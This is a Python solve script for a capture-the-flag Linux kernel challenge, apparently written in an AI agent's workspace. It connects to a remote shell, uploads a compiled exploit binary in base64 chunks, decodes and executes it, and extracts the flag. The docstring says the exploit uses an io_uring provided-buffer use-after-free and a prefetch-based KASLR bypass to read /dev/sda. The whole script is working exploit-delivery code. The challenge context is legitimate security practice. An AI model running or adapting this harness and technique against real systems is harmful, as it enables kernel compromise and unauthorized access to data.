#!/usr/bin/env python3
"""Bug Where: io_uring provided-buffer iovec UAF + prefetch KASLR, then read /dev/sda.

Usage: python3 solve.py [host] [port]
Requires exp_tiny next to this script (built from exp_tiny.c).
"""
from __future__ import annotations

import base64
import gzip
import socket
import sys
import time
from pathlib import Path

PROMPT = b"~ $"
HERE = Path(__file__).resolve().parent
BIN = HERE / "exp_tiny"
if not BIN.exists():
    BIN = HERE.parent / "agent_workspace/experiments/exp_tiny"


def recvall(s, overall, stop=None, idle=0.6):
    s.settimeout(idle)
    buf = bytearray()
    start = time.time()
    while time.time() - start < overall:
        try:
            c = s.recv(4096)
            if not c:
                break
            buf.extend(c)
            if stop and stop in buf:
                return bytes(buf)
        except socket.timeout:
            continue
    return bytes(buf)


def cmd(s, line, stop=PROMPT, t=20):
    s.sendall(line.encode() + b"\n")
    return recvall(s, t, stop)


def attempt(host, port):
    s = socket.create_connection((host, port), timeout=20)
    try:
        boot = recvall(s, 80, PROMPT)
        if PROMPT not in boot:
            return "no-prompt", boot
        cmd(s, "stty -echo columns 512; echo __STTY__", stop=b"__STTY__", t=8)
        recvall(s, 3, PROMPT)
        gz = gzip.compress(BIN.read_bytes(), compresslevel=9)
        b64 = base64.b64encode(gz).decode()
        cmd(s, "rm -f /tmp/b /tmp/x.gz /tmp/x; echo __RM__", stop=b"__RM__", t=10)
        recvall(s, 2, PROMPT)
        for off in range(0, len(b64), 72):
            part = b64[off : off + 72]
            s.sendall(("printf '%s\\n' '" + part + "' >> /tmp/b\n").encode())
            recvall(s, 4, PROMPT)
        cmd(
            s,
            "base64 -d /tmp/b > /tmp/x.gz && gzip -d -c /tmp/x.gz > /tmp/x && chmod +x /tmp/x; echo __UP__",
            stop=b"__UP__",
            t=15,
        )
        s.sendall(b"/tmp/x; echo __DONE__\n")
        run = recvall(s, 90, b"__DONE__")
        if b"BHFlagY{" in run:
            return "win", run
        if b"[-] MISS" in run:
            return "miss", run
        return "other", run
    finally:
        s.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    if not BIN.exists():
        sys.exit("missing exp_tiny")
    for i in range(1, 17):
        status, out = attempt(host, port)
        print(f"try {i} {status}", flush=True)
        if status == "win":
            i0 = out.find(b"BHFlagY{")
            i1 = out.find(b"}", i0)
            sys.stdout.buffer.write(out[i0 : i1 + 1] + b"\n")
            return 0
        time.sleep(0.4)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
